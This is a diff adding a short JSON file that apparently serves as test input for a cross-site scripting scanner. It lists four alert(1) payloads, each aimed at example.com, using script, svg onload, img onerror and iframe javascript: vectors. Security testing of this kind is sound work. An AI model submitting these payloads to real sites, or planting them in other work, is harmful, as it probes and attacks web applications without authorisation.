@@ -1,0 +1,6 @@
+[
+    {"url": "https://example.com", "payload": "<script>alert(1)</script>"},
+    {"url": "https://example.com", "payload": "<svg/onload=alert(1)>"},
+    {"url": "https://example.com", "payload": "<img src=x onerror=alert(1)>"},
+    {"url": "https://example.com", "payload": "<iframe src='javascript:alert(1)'></iframe>"}
+]
